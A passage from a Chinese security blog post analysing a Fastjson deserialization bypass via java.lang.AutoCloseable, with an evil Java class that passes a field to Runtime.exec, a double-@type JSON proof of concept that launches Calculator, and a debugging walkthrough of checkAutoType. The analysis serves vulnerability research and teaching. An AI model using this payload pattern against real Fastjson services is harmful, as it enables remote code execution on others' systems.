</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName ExecCloseable
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/20 00:09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> ExecCloseable <span style="color:#fff;font-weight:bold">implements</span> AutoCloseable {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> String domain;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getDomain() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(domain);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setDomain(String domain) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">domain</span> = domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> close() <span style="color:#fff;font-weight:bold">throws</span> IOException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>POC如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;java.lang.AutoCloseable&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.reus09.Evil.ExecCloseable&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;domain&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="调试-2">调试<a hidden class="anchor" aria-hidden="true" href="#调试-2">#</a></h5>
<p>第一次进入<code>CheckAutoType()</code>函数的执行逻辑和前面讲到的<code>java.lang.Exception</code>处理逻辑是一样的，同样是在<code>mappings</code>中获取</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420021920333.png" alt="image-20230420021920333"  />
</p>
<p>后面逻辑差不多，获得<code>clazz</code>之后，然后回到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>方法，然后调用<code>ParserConfig#getDeserializer</code>方法来获得反序列化器，因为<code>AutoCloseable</code>不满足上述类的获得反序列化器的条件，所以到了最后一步通过<code>ParserConfig#createJavaBeanDeserializer</code> 方法来构造 JavaBeanDeserializer对象。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022317290.png" alt="image-20230420022317290"  />
</p>
<p>之后就调用<code>JavaBeanDeserializer</code>的<code>deserialze</code>方法，</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022432268.png" alt="image-20230420022432268"  />
</p>
<p>在 <code>deserialze()</code> 方法中又做了一次 checkAutoType 检测，此处直接将第二个 @type 的类名，和前面构造 JavaBeanDeserializer 对象时指定的期望类直接传了进来。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022704968.png" alt="image-20230420022704968"  />
</p>
<p>然后就和在<code>ThrowableDeserializer</code>的步骤差不多，来到<code>expectClass</code>不为空的情况，将恶意类添加到<code>mappings</code>里面，然后返回clazz。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420022854184.png" alt="image-20230420022854184"  />
</p>
<p>checkAutoType()调用完返回类之后，然后再次获得<code> JavaBeanDeserializer</code>反序列化器，在它的<code>deserialze</code>方法中，最终调用<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#createInstance()</code>通过代理实例化恶意类实例进而调用其构造函数从而成功触发漏洞。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420023259964.png" alt="image-20230420023259964"  />
</p>
<h3 id="fastjson-1280">fastjson-1.2.80<a hidden class="anchor" aria-hidden="true" href="#fastjson-1280">#</a></h3>
<p>见之前文章。</p>
<h2 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h2>
<p>经过上面的分析，我们直到如果想要通过checkAutoType的检验，有以下几种方法:</p>
<ul>
<li>传入的类在白名单中</li>
<li>开启了autotype(autoTypeSupport is true)</li>
<li>使用了JSONType注解(如:fastjson.annotation.JSONType)</li>
<li>某些期望类 (继承于expectClass)</li>
<li>要反序列化的类在cache中 (TypeUtils.mappings列表中有 @type 指定的类)</li>
</ul>
<p>但具体可以操作的路线、攻击链感觉还是要对代码有足够的熟练掌握。</p>
<p>总的来说，感觉fastjson漏洞的利用大部分都是一些逻辑上的代码问题，同时也是黑客巧妙的攻击链构造。</p>
<p>最后，学习到了一些<code>FastJson反序列化</code>的基本原理，之前都是云里雾里，不知其所以然。此外，对<code>FastJson</code>的<code>parse</code>、<code>parseObject</code>相关方法的区别。还有就是发现现在写博客往往都是对别人的文章大抄特抄，自己的东西、思考太少了，为什么要这样写?为什么这么思考?以后还是需要努力。</p>
<h2 id="reference">Reference<a hidden class="anchor" aria-hidden="true" href="#reference">#</a></h2>
<ul>
<li><a href="https://su18.org/post/fastjson/#1-fastjson-1224">https://su18.org/post/fastjson/#1-fastjson-1224</a></li>
<li><a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></li>
<li><a href="https://www.yang99.top/index.php/archives/71/">https://www.yang99.top/index.php/archives/71/</a></li>
<li><a href="https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl">https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl</a></li>
<li><a href="https://juejin.cn/post/6846687594130964488#heading-3">https://juejin.cn/post/6846687594130964488#heading-3</a></li>
<li><a href="https://blog.csdn.net/hosaos/article/details/106982555">https://blog.csdn.net/hosaos/article/details/106982555</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="/posts/tech/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">
    <span class="title">« Prev</span>
    <br>
    <span>Java之动态代理</span>
  </a>
  <a class="next" href="/posts/tech/cve-2022-25845-fastjson-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
    <span class="title">Next »</span>
    <br>
    <span>CVE-2022-25845 FastJson RCE漏洞分析</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
